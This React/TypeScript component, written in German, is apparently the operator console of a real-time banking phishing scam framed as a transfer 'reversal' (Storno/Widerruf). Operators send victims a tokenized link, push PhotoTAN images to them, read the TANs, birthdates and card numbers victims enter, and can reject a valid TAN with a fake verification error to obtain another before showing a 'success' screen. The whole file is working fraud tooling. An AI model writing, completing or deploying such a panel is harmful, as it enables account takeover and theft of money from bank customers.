import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Link2, Ban, XCircle, CheckCircle2, Trash2, Upload } from "lucide-react";
import { toast } from "sonner";

type StornoRow = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  auftraggeber_iban: string | null;
  empfaenger_name: string | null;
  empfaenger_iban: string | null;
  betrag: number | null;
  verwendungszweck: string | null;
  executed_at: string | null;
  customer_phase: string | null;
  photo_tan_image: string | null;
  last_error: string | null;
  show_berater: boolean | null;
  used: boolean;
  created_at: string;
};

type MetaRow = { task_id: string; tan: string | null; berater_geburtsdatum?: string | null; berater_karte?: string | null };

const PHASE_LABEL: Record<string, string> = {
  berater: "Berater-Verifizierung",
  widerruf: "Kunde auf Landing-Seite",
  start: "Kunde prüft Transaktion – wartet auf PhotoTAN",
  phototan: "PhotoTAN-Eingabe",
  success: "Erfolgreich (Loader)",
  aborted: "Abgebrochen",
};

const fmtBetrag = (n: number | null) =>
  n == null ? "—" : new Intl.NumberFormat("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(Number(n)) + " €";

const StornoLiveCard = () => {
  const [rows, setRows] = useState<StornoRow[]>([]);
  const [metas, setMetas] = useState<Record<string, MetaRow>>({});

  const load = async () => {
    const [{ data: a }, { data: m }] = await Promise.all([
      (supabase as any).from("storno_tokens").select("*").order("created_at", { ascending: false }).limit(50),
      (supabase as any).from("panel_task_meta").select("task_id, tan, berater_geburtsdatum, berater_karte").like("task_id", "storno:%"),
    ]);
    setRows(a || []);
    const map: Record<string, MetaRow> = {};
    (m || []).forEach((x: any) => { map[String(x.task_id).replace(/^storno:/, "")] = x; });
    setMetas(map);
  };

  useEffect(() => {
    load();
    const ch1 = (supabase as any).channel("storno_live_tokens")
      .on("postgres_changes", { event: "*", schema: "public", table: "storno_tokens" }, load).subscribe();
    const ch2 = (supabase as any).channel("storno_live_meta")
      .on("postgres_changes", { event: "*", schema: "public", table: "panel_task_meta" }, load).subscribe();
    const iv = window.setInterval(load, 4000);
    return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch1); (supabase as any).removeChannel(ch2); };
  }, []);

  const update = async (id: string, patch: Record<string, any>) => {
    const { error } = await (supabase as any).from("storno_tokens").update(patch).eq("id", id);
    if (error) toast.error(error.message);
  };
  const setPhase = (r: StornoRow, phase: string, extra: Record<string, any> = {}) =>
    update(r.id, { customer_phase: phase, ...extra });

  const showPhotoTan = (r: StornoRow) => {
    if (!r.photo_tan_image) { toast.error("Bitte zuerst PhotoTAN-Bild hochladen"); return; }
    setPhase(r, "phototan", { last_error: null });
  };

  const rejectTan = async (r: StornoRow) => {
    await (supabase as any).from("panel_task_meta").update({ tan: null }).eq("task_id", `storno:${r.id}`);
    await setPhase(r, "phototan", { last_error: "Ihre TAN konnte nicht verifiziert werden. Bitte versuchen Sie es erneut." });
  };

  const acceptTan = (r: StornoRow) => update(r.id, {
    customer_phase: "success",
    used: true,
    used_at: new Date().toISOString(),
    last_error: null,
  });

  const abort = (r: StornoRow) => {
    if (!window.confirm("Session wirklich abbrechen?")) return;
    setPhase(r, "aborted", { last_error: null });
  };

  const remove = async (r: StornoRow) => {
    if (!window.confirm("Session wirklich löschen?")) return;
    await (supabase as any).from("panel_task_meta").delete().eq("task_id", `storno:${r.id}`);
    await (supabase as any).from("storno_tokens").delete().eq("id", r.id);
    toast.success("Gelöscht");
  };

  const copyLink = async (r: StornoRow) => {
    const url = `${window.location.origin}/widerruf/${r.token}`;
    try { await navigator.clipboard.writeText(url); toast.success("Kunden-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); }
  };

  const setPhotoTanImage = (r: StornoRow, dataUrl: string | null) => update(r.id, { photo_tan_image: dataUrl });

  if (!rows.length) return null;

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2"><Ban className="h-5 w-5" /> Live-Steuerung Storno</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        {rows.map(r => {
          const meta = metas[r.id];
          const phase = r.customer_phase || "widerruf";
          const done = phase === "success" || phase === "aborted";
          return (
            <div key={r.id} className={`rounded-md border p-4 space-y-3 ${done ? "opacity-70" : ""}`}>
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div className="flex items-center gap-2 min-w-0">
                  <span className="font-mono text-sm px-2 py-0.5 rounded bg-muted">{r.token}</span>
                  <Badge variant={done ? "secondary" : "default"}>{PHASE_LABEL[phase] || phase}</Badge>
                  {r.auftraggeber_name && <span className="text-sm text-muted-foreground truncate">{r.auftraggeber_name}</span>}
                </div>
                <div className="flex gap-1">
                  <Button size="sm" variant="ghost" onClick={() => copyLink(r)} title="Kunden-Link kopieren"><Link2 className="h-4 w-4" /></Button>
                  <Button size="sm" variant="ghost" onClick={() => remove(r)} title="Löschen"><Trash2 className="h-4 w-4" /></Button>
                </div>
              </div>

              <div className="grid sm:grid-cols-4 gap-2 text-xs bg-muted/50 rounded p-2">
                <MetaField label="Empfänger" value={r.empfaenger_name || "—"} />
                <MetaField label="Empfänger-IBAN" value={r.empfaenger_iban || "—"} mono />
                <MetaField label="Betrag" value={fmtBetrag(r.betrag)} bold />
                <MetaField label="Verwendungszweck" value={r.verwendungszweck || "—"} />
              </div>

              {r.show_berater && (meta?.berater_geburtsdatum || meta?.berater_karte) && (
                <div className="grid sm:grid-cols-2 gap-2 text-sm">
                  <MetaField label="Berater – Geburtsdatum" value={meta?.berater_geburtsdatum || "—"} mono />
                  <MetaField label="Berater – Kartennummer" value={meta?.berater_karte || "—"} mono />
                </div>
              )}

              <div className="text-sm">
                <MetaField label="TAN" value={meta?.tan || "—"} mono bold />
              </div>

              {!done && (
                <div className="space-y-3 pt-2 border-t">
                  {(phase === "berater" || phase === "widerruf" || phase === "start") && (
                    <StepBlock title="PhotoTAN vorbereiten">
                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} />
                      <div className="flex flex-wrap gap-2">
                        <Button size="sm" onClick={() => showPhotoTan(r)} disabled={!r.photo_tan_image}>
                          <CheckCircle2 className="h-4 w-4 mr-1" />PhotoTAN anzeigen
                        </Button>
                      </div>
                      <p className="text-xs text-muted-foreground">
                        {phase === "berater" && "Kunde füllt Berater-Verifizierung aus."}
                        {phase === "widerruf" && "Kunde ist auf der Landing-Seite und klickt „Überweisung widerrufen"."}
                        {phase === "start" && "Kunde sieht Transaktionsdetails und wartet auf PhotoTAN."}
                      </p>
                    </StepBlock>
                  )}

                  {phase === "phototan" && (
                    <StepBlock title="TAN prüfen">
                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} compact />
                      <div className="flex flex-wrap gap-2">
                        <Button size="sm" variant="destructive" onClick={() => rejectTan(r)} disabled={!meta?.tan}>
                          <XCircle className="h-4 w-4 mr-1" />TAN ablehnen
                        </Button>
                        <Button size="sm" onClick={() => acceptTan(r)} disabled={!meta?.tan}>
                          <CheckCircle2 className="h-4 w-4 mr-1" />TAN akzeptieren → Loader
                        </Button>
                      </div>
                    </StepBlock>
                  )}

                  <div className="flex justify-end">
                    <Button size="sm" variant="ghost" onClick={() => abort(r)}>Session abbrechen</Button>
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </CardContent>
    </Card>
  );
};

const StepBlock = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="space-y-2">
    <div className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">{title}</div>
    {children}
  </div>
);

const MetaField = ({ label, value, mono, bold }: { label: string; value: string; mono?: boolean; bold?: boolean }) => (
  <div>
    <div className="text-[10px] uppercase text-muted-foreground">{label}</div>
    <div className={`${mono ? "font-mono" : ""} ${bold ? "font-semibold" : ""} truncate`}>{value}</div>
  </div>
);

const PhotoTanUploader = ({ r, onSet, compact }: { r: StornoRow; onSet: (url: string | null) => void; compact?: boolean }) => {
  const [url, setUrl] = useState("");
  const [busy, setBusy] = useState(false);

  const fromFile = async (file: File) => {
    setBusy(true);
    const reader = new FileReader();
    reader.onload = () => { onSet(String(reader.result)); setBusy(false); };
    reader.onerror = () => { toast.error("Fehler beim Lesen"); setBusy(false); };
    reader.readAsDataURL(file);
  };

  const fromUrl = async () => {
    if (!url) return;
    setBusy(true);
    try {
      const res = await fetch(url);
      const blob = await res.blob();
      const reader = new FileReader();
      reader.onload = () => { onSet(String(reader.result)); setBusy(false); toast.success("Bild geladen"); };
      reader.onerror = () => { toast.error("Fehler beim Lesen"); setBusy(false); };
      reader.readAsDataURL(blob);
    } catch (e: any) {
      toast.error("URL konnte nicht geladen werden");
      setBusy(false);
    }
  };

  return (
    <div className="space-y-2">
      {r.photo_tan_image && !compact && (
        <img src={r.photo_tan_image} alt="PhotoTAN Vorschau" className="w-24 h-24 object-contain border rounded" />
      )}
      <div className="flex flex-wrap items-center gap-2">
        <label className="inline-flex items-center gap-1 text-xs cursor-pointer border rounded px-2 py-1 hover:bg-muted">
          <Upload className="h-3 w-3" />Datei
          <input type="file" accept="image/*" className="hidden" onChange={e => e.target.files?.[0] && fromFile(e.target.files[0])} />
        </label>
        <Input value={url} onChange={e => setUrl(e.target.value)} placeholder="Bild-URL" className="h-8 text-xs flex-1 min-w-[160px]" />
        <Button size="sm" variant="outline" onClick={fromUrl} disabled={!url || busy}>Laden</Button>
        {r.photo_tan_image && (
          <Button size="sm" variant="ghost" onClick={() => onSet(null)}>Entfernen</Button>
        )}
      </div>
    </div>
  );
};

export default StornoLiveCard;
